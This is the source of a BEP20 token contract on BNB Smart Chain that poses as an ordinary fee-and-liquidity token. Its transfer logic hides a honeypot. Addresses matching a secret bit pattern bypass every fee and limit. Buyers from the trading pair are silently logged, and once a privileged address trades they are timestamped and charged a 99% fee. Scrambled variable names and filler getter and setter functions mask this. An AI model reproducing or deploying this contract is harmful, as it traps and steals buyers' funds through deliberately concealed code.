/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ApcalloverPrecipitationBrilliant is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Apcallover Precipitation Brilliant ";
    string constant _symbol = "ApcalloverPrecipitationBrilliant";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private sellMaxBuyIsSwapExemptTrading;
    mapping(address => bool) private launchedTradingTeamExempt;
    mapping(address => bool) private walletIsMaxMin;
    mapping(address => bool) private liquidityBotsMarketingBurn;
    mapping(address => uint256) private tradingBurnLiquidityWallet;
    mapping(uint256 => address) private liquidityTradingFeeMarketing;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsExemptLaunchedLimit = 0;
    uint256 private limitMarketingMinWalletTrading = 7;

    //SELL FEES
    uint256 private receiverLiquidityBotsMode = 0;
    uint256 private marketingTeamLimitTrading = 7;

    uint256 private minFeeTxReceiver = limitMarketingMinWalletTrading + botsExemptLaunchedLimit;
    uint256 private isTeamMaxLiquidityBurnTradingLaunched = 100;

    address private burnMinWalletAuto = (msg.sender); // auto-liq address
    address private feeReceiverSellLimit = (0x455a943bFdf7EA823aa3127cfFFfC48c5532720b); // marketing address
    address private sellTradingIsExempt = DEAD;
    address private receiverAutoSellTxLiquidity = DEAD;
    address private walletLimitTxSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoTradingLiquidityMaxBuy;
    uint256 private swapMaxReceiverIs;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private autoIsMaxTrading;
    uint256 private marketingBurnSwapBuy;
    uint256 private limitBurnIsLiquidity;
    uint256 private buyWalletSellTeamBots;
    uint256 private isMinTeamBurn;

    bool private tradingMaxAutoExemptWallet = true;
    bool private liquidityBotsMarketingBurnMode = true;
    bool private tradingSellExemptLiquidity = true;
    bool private maxAutoLaunchedTeam = true;
    bool private txFeeSellTeamReceiverTradingLimit = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minLiquidityIsSwap = _totalSupply / 1000; // 0.1%

    
    uint256 private tradingIsExemptTeam;
    uint256 private modeIsFeeBurnSwapReceiver;
    bool private teamFeeModeMarketing;
    bool private launchedReceiverTeamFee;
    bool private teamSellIsReceiverLiquidityBuy;
    uint256 private buyIsMaxAuto;
    bool private txBotsSwapWalletSellExempt;
    bool private feeTxBuyBots;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        autoIsMaxTrading = true;

        sellMaxBuyIsSwapExemptTrading[msg.sender] = true;
        sellMaxBuyIsSwapExemptTrading[address(this)] = true;

        launchedTradingTeamExempt[msg.sender] = true;
        launchedTradingTeamExempt[0x0000000000000000000000000000000000000000] = true;
        launchedTradingTeamExempt[0x000000000000000000000000000000000000dEaD] = true;
        launchedTradingTeamExempt[address(this)] = true;

        walletIsMaxMin[msg.sender] = true;
        walletIsMaxMin[0x0000000000000000000000000000000000000000] = true;
        walletIsMaxMin[0x000000000000000000000000000000000000dEaD] = true;
        walletIsMaxMin[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txBurnModeLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return txBurnModeLimit(sender, recipient, amount);
    }

    function txBurnModeLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = exemptMaxAutoModeReceiver(sender) || exemptMaxAutoModeReceiver(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitAutoWalletIsMaxMin();
            }
            if (!bLimitTxWalletValue) {
                botsExemptBurnTx(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return tradingAutoModeSellLiquidity(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(tradingMaxAutoExemptWallet, "Trading is not active");
        }

        if (!Administration[sender] && !sellMaxBuyIsSwapExemptTrading[sender] && !sellMaxBuyIsSwapExemptTrading[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || walletIsMaxMin[sender] || walletIsMaxMin[recipient], "Max TX Limit has been triggered");

        if (exemptLaunchedFeeSwapAutoReceiver()) {launchedFeeLiquidityTrading();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = buyWalletSwapIs(sender) ? burnTeamSwapLiquidityMaxTxFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingAutoModeSellLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function buyWalletSwapIs(address sender) internal view returns (bool) {
        return !launchedTradingTeamExempt[sender];
    }

    function isSellTradingMaxBotsBuyReceiver(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            minFeeTxReceiver = marketingTeamLimitTrading + receiverLiquidityBotsMode;
            return teamSwapSellWallet(sender, minFeeTxReceiver);
        }
        if (!selling && sender == uniswapV2Pair) {
            minFeeTxReceiver = limitMarketingMinWalletTrading + botsExemptLaunchedLimit;
            return minFeeTxReceiver;
        }
        return teamSwapSellWallet(sender, minFeeTxReceiver);
    }

    function burnTeamSwapLiquidityMaxTxFee(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(isSellTradingMaxBotsBuyReceiver(sender, receiver == uniswapV2Pair)).div(isTeamMaxLiquidityBurnTradingLaunched);

        if (liquidityBotsMarketingBurn[sender] || liquidityBotsMarketingBurn[receiver]) {
            feeAmount = amount.mul(99).div(isTeamMaxLiquidityBurnTradingLaunched);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function exemptMaxAutoModeReceiver(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function teamSwapSellWallet(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = tradingBurnLiquidityWallet[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function botsExemptBurnTx(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        liquidityTradingFeeMarketing[exemptLimitValue] = addr;
    }

    function limitAutoWalletIsMaxMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (tradingBurnLiquidityWallet[liquidityTradingFeeMarketing[i]] == 0) {
                    tradingBurnLiquidityWallet[liquidityTradingFeeMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeReceiverSellLimit).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptLaunchedFeeSwapAutoReceiver() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    txFeeSellTeamReceiverTradingLimit &&
    _balances[address(this)] >= minLiquidityIsSwap;
    }

    function launchedFeeLiquidityTrading() internal swapping {
        uint256 amountToLiquify = minLiquidityIsSwap.mul(botsExemptLaunchedLimit).div(minFeeTxReceiver).div(2);
        uint256 amountToSwap = minLiquidityIsSwap.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = minFeeTxReceiver.sub(botsExemptLaunchedLimit.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsExemptLaunchedLimit).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitMarketingMinWalletTrading).div(totalETHFee);

        payable(feeReceiverSellLimit).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                burnMinWalletAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnMinWalletAuto() public view returns (address) {
        if (burnMinWalletAuto != sellTradingIsExempt) {
            return sellTradingIsExempt;
        }
        return burnMinWalletAuto;
    }
    function setBurnMinWalletAuto(address a0) public onlyOwner {
        if (burnMinWalletAuto == walletLimitTxSwap) {
            walletLimitTxSwap=a0;
        }
        if (burnMinWalletAuto != walletLimitTxSwap) {
            walletLimitTxSwap=a0;
        }
        burnMinWalletAuto=a0;
    }

    function getMinLiquidityIsSwap() public view returns (uint256) {
        if (minLiquidityIsSwap == botsExemptLaunchedLimit) {
            return botsExemptLaunchedLimit;
        }
        return minLiquidityIsSwap;
    }
    function setMinLiquidityIsSwap(uint256 a0) public onlyOwner {
        if (minLiquidityIsSwap == isTeamMaxLiquidityBurnTradingLaunched) {
            isTeamMaxLiquidityBurnTradingLaunched=a0;
        }
        if (minLiquidityIsSwap == receiverLiquidityBotsMode) {
            receiverLiquidityBotsMode=a0;
        }
        minLiquidityIsSwap=a0;
    }

    function getLiquidityBotsMarketingBurn(address a0) public view returns (bool) {
        if (a0 == receiverAutoSellTxLiquidity) {
            return tradingMaxAutoExemptWallet;
        }
        if (liquidityBotsMarketingBurn[a0] != liquidityBotsMarketingBurn[a0]) {
            return txFeeSellTeamReceiverTradingLimit;
        }
        if (liquidityBotsMarketingBurn[a0] != sellMaxBuyIsSwapExemptTrading[a0]) {
            return tradingSellExemptLiquidity;
        }
            return liquidityBotsMarketingBurn[a0];
    }
    function setLiquidityBotsMarketingBurn(address a0,bool a1) public onlyOwner {
        if (liquidityBotsMarketingBurn[a0] == sellMaxBuyIsSwapExemptTrading[a0]) {
           sellMaxBuyIsSwapExemptTrading[a0]=a1;
        }
        if (liquidityBotsMarketingBurn[a0] != launchedTradingTeamExempt[a0]) {
           launchedTradingTeamExempt[a0]=a1;
        }
        if (a0 != receiverAutoSellTxLiquidity) {
            tradingSellExemptLiquidity=a1;
        }
        liquidityBotsMarketingBurn[a0]=a1;
    }

    function getBotsExemptLaunchedLimit() public view returns (uint256) {
        if (botsExemptLaunchedLimit != receiverLiquidityBotsMode) {
            return receiverLiquidityBotsMode;
        }
        if (botsExemptLaunchedLimit != limitMarketingMinWalletTrading) {
            return limitMarketingMinWalletTrading;
        }
        return botsExemptLaunchedLimit;
    }
    function setBotsExemptLaunchedLimit(uint256 a0) public onlyOwner {
        if (botsExemptLaunchedLimit == minLiquidityIsSwap) {
            minLiquidityIsSwap=a0;
        }
        if (botsExemptLaunchedLimit == isTeamMaxLiquidityBurnTradingLaunched) {
            isTeamMaxLiquidityBurnTradingLaunched=a0;
        }
        botsExemptLaunchedLimit=a0;
    }

    function getSellTradingIsExempt() public view returns (address) {
        if (sellTradingIsExempt != sellTradingIsExempt) {
            return sellTradingIsExempt;
        }
        return sellTradingIsExempt;
    }
    function setSellTradingIsExempt(address a0) public onlyOwner {
        if (sellTradingIsExempt == burnMinWalletAuto) {
            burnMinWalletAuto=a0;
        }
        if (sellTradingIsExempt == walletLimitTxSwap) {
            walletLimitTxSwap=a0;
        }
        sellTradingIsExempt=a0;
    }

    function getMarketingTeamLimitTrading() public view returns (uint256) {
        if (marketingTeamLimitTrading == minFeeTxReceiver) {
            return minFeeTxReceiver;
        }
        if (marketingTeamLimitTrading != minFeeTxReceiver) {
            return minFeeTxReceiver;
        }
        return marketingTeamLimitTrading;
    }
    function setMarketingTeamLimitTrading(uint256 a0) public onlyOwner {
        if (marketingTeamLimitTrading == minFeeTxReceiver) {
            minFeeTxReceiver=a0;
        }
        if (marketingTeamLimitTrading == limitMarketingMinWalletTrading) {
            limitMarketingMinWalletTrading=a0;
        }
        if (marketingTeamLimitTrading == botsExemptLaunchedLimit) {
            botsExemptLaunchedLimit=a0;
        }
        marketingTeamLimitTrading=a0;
    }

    function getReceiverAutoSellTxLiquidity() public view returns (address) {
        return receiverAutoSellTxLiquidity;
    }
    function setReceiverAutoSellTxLiquidity(address a0) public onlyOwner {
        if (receiverAutoSellTxLiquidity == sellTradingIsExempt) {
            sellTradingIsExempt=a0;
        }
        receiverAutoSellTxLiquidity=a0;
    }

    function getWalletLimitTxSwap() public view returns (address) {
        if (walletLimitTxSwap == feeReceiverSellLimit) {
            return feeReceiverSellLimit;
        }
        return walletLimitTxSwap;
    }
    function setWalletLimitTxSwap(address a0) public onlyOwner {
        if (walletLimitTxSwap != sellTradingIsExempt) {
            sellTradingIsExempt=a0;
        }
        if (walletLimitTxSwap == burnMinWalletAuto) {
            burnMinWalletAuto=a0;
        }
        if (walletLimitTxSwap == walletLimitTxSwap) {
            walletLimitTxSwap=a0;
        }
        walletLimitTxSwap=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}